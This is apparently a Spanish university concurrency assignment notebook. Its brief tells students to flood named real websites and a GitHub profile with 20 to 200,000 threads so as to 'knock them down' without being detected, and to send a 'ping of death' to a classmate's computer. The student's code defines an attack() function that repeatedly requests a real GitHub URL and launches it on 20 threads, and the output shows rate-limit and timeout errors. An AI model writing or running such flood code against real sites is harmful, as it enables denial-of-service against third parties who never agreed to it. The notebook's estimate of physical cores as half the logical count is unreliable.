# %% [markdown]
# <h1 style = "text-align:center; front-size: 36px"> Programación Concurrente y Distribuida </h1>
# <a href="https://github.com/sfms97">
#     <img src="photo.jpg" title = "Samuel Fernando Méndez Saldías 22033190" alt="Samuel Fernando Méndez Saldías 22033190" width="100" height="100" style="float:left;vertical-align:centre">
#     <img src="logo.png" title = "M21" alt="UE" width="105" height="105" style="float:right;vertical-align:centre">

# %% [markdown]
# #  PRACTICA NUMERO 4
#
# ## THREADS ( CONCURRENCY )
#
#
# ### ENUNCIADO, Cree un programa para detemrinar:
# #### Con el objetivo de evitar ser detectado por los servidores a atacar y tomando en cuenta que queremos que el ataque sea "simultaneo", use hilos para que todos los ataques sean concurrentes
#
# 1. Crear platilla y portada para todos los ejercicios que realicemos a lo largo del curso.
# 2. Determine los tipos de respuesta de la parte cliente
# 3. El número de proceso que maneja y cuantos procesos están activos.
# 4. ¿Cuántos hilos activos tienes en este momento?
# 5. ¿Cuántos cores lógicos tiene tu equipo?
# 6. ¿Cuántos cores físicos tiene tu equipo?
# 7. Enumere e identifique los hilos lanzados.
# 8. Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay
# 9. Lance un ataque usando 200 hilos a: https://www.youtube.com/UCEXbXdeafAjBahYK2hoQJFg
# 10. Lance un ataque usando 2000 hilos a: https://rpubs.com/christian_sucuzhanay
# 11. Lance un ataque usando 200000 hilos a: https://rpubs.com/christian_sucuzhanay
# 14. Lance un ataque usando 400 hilos a: https://eburnout.com/
# 15. ¿Que páginas logro "tumbar"?
# 16. Lance 20 hilos con el ping de la muerte al equipo de su compañero (a elegir)

# %%
import threading as th
import os
import requests
import platform

# %%
from IPython import display

# %%
pwd
# Out:
# 'C:\\Users\\feern\\Practica 3 - PCD'

# %%
display.Image("scr.png")

# %% [markdown]
# # 2

# %% [markdown]
# # 3

# %% [markdown]
# # 4

# %%
th.active_count()
# Out:
# 6

# %% [markdown]
# # 5

# %%
print ("Mi equipo tiene " + str(os.cpu_count()) + " logicos")
# Out:
# Mi equipo tiene 12 logicos

# %% [markdown]
# # 6

# %%
print ("Mi equipo tiene " + str(os.cpu_count()/2) + " fisicos")
# Out:
# Mi equipo tiene 6.0 fisicos

# %% [markdown]
# # 7

# %% [markdown]
# # 8

# %%
requests.get('https://github.com/sukuzhanay')
# Out:
# <Response [429]>

# %%
def attack():
        requests.get('https://github.com/sukuzhanay')

# %%
th.Thread(target=attack).start()
# Out:
# Exception in thread Thread-13:
# Traceback (most recent call last):
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connection.py", line 169, in _new_conn
#     conn = connection.create_connection(
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\util\connection.py", line 96, in create_connection
#     raise err
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\util\connection.py", line 86, in create_connection
#     sock.connect(sa)
# TimeoutError: [WinError 10060] Se produjo un error durante el intento de conexión ya que la parte conectada no respondió adecuadamente tras un periodo de tiempo, o bien se produjo un error en la conexión establecida ya que el host conectado no ha podido responder
#
# During handling of the above exception, another exception occurred:
#
# Traceback (most recent call last):
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connectionpool.py", line 699, in urlopen
#     httplib_response = self._make_request(
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connectionpool.py", line 382, in _make_request
#     self._validate_conn(conn)
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connectionpool.py", line 1010, in _validate_conn
#     conn.connect()
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connection.py", line 353, in connect
#     conn = self._new_conn()
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connection.py", line 181, in _new_conn
#     raise NewConnectionError(
# urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPSConnection object at 0x0000026EFDB46490>: Failed to establish a new connection: [WinError 10060] Se produjo un error durante el intento de conexión ya que la parte conectada no respondió adecuadamente tras un periodo de tiempo, o bien se produjo un error en la conexión establecida ya que el host conectado no ha podido responder
#
# During handling of the above exception, another exception occurred:
#
# Traceback (most recent call last):
#   File "C:\Users\feern\anaconda3\lib\site-packages\requests\adapters.py", line 439, in send
#     resp = conn.urlopen(
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\connectionpool.py", line 755, in urlopen
#     retries = retries.increment(
#   File "C:\Users\feern\anaconda3\lib\site-packages\urllib3\util\retry.py", line 574, in increment
#     raise MaxRetryError(_pool, url, error or ResponseError(cause))
# urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='github.com', port=443): Max retries exceeded with url: /sukuzhanay (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x0000026EFDB46490>: Failed to establish a new connection: [WinError 10060] Se produjo un error durante el intento de conexión ya que la parte conectada no respondió adecuadamente tras un periodo de tiempo, o bien se produjo un error en la conexión establecida ya que el host conectado no ha podido responder'))
#
# During handling of the above exception, another exception occurred:
#
# Traceback (most recent call last):
#   File "C:\Users\feern\anaconda3\lib\threading.py", line 932, in _bootstrap_inner
#     self.run()
#   File "C:\Users\feern\anaconda3\lib\threading.py", line 870, in run
#     self._target(*self._args, **self._kwargs)
#   File "<ipython-input-33-23ad04ed27e1>", line 3, in attack
#   File "C:\Users\feern\anaconda3\lib\site-packages\requests\api.py", line 76, in get
#     return request('get', url, params=params, **kwargs)
#   File "C:\Users\feern\anaconda3\lib\site-packages\requests\api.py", line 61, in request
#     return session.request(method=method, url=url, **kwargs)
#   File "C:\Users\feern\anaconda3\lib\site-packages\requests\sessions.py", line 542, in request
#     resp = self.send(prep, **send_kwargs)
#   File "C:\Users\feern\anaconda3\lib\site-packages\requests\sessions.py", line 655, in send
#     r = adapter.send(request, **kwargs)
#   File "C:\Users\feern\anaconda3\lib\site-packages\requests\adapters.py", line 516, in send
#     raise ConnectionError(e, request=request)
# requests.exceptions.ConnectionError: HTTPSConnectionPool(host='github.com', port=443): Max retries exceeded with url: /sukuzhanay (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x0000026EFDB46490>: Failed to establish a new connection: [WinError 10060] Se produjo un error durante el intento de conexión ya que la parte conectada no respondió adecuadamente tras un periodo de tiempo, o bien se produjo un error en la conexión establecida ya que el host conectado no ha podido responder'))

# %%
for i in range(20):
    th.Thread(target=attack).start()
